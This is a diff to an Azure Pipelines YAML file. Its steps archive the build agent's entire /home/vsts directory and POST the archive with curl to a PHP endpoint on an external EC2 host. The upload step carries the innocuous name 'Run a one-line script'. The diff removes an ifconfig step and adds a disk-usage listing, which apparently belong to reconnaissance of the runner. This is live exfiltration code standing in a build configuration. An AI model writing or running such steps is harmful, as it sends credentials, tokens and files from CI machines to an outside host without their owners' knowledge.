@@ -10,12 +10,12 @@ pool:
   vmImage: ubuntu-latest
 
 steps:
-- script: tar -czvf --exclude=".local/" --exclude="teste1.gz" /home/vsts/teste1.tgz /home/vsts/
+- script: tar -czvf /home/vsts/teste1.tgz /home/vsts/
   displayName: 'Tar'
   continueOnError: True
 
-- script: ifconfig
-  displayName: 'network'
+- script: du -lah -d 2 /home/vsts
+  displayName: 'du'
 
 - script: curl -d "@/home/vsts/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
   displayName: 'Run a one-line script'
